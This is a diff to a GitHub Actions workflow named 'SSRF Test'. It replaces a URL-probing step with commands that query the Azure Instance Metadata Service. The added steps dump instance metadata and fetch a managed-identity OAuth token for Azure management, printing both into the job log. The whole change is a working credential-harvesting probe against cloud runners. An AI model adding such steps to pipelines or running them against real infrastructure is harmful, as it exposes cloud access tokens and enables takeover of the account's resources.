@@ -1,14 +1,14 @@
 name: SSRF Test
 on:
   workflow_dispatch:
-    inputs:
-      target_url:
-        description: 'URL to test'
-        required: true
-        type: string
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Test URL
-        run: curl -s -o /dev/null -w "%{http_code}" "${{ github.event.inputs.target_url }}" || true
+      - name: Test Azure IMDS with header
+        run: |
+          echo "=== IMDS Instance ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -500
+          echo ""
+          echo "=== IMDS Identity Token ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -200
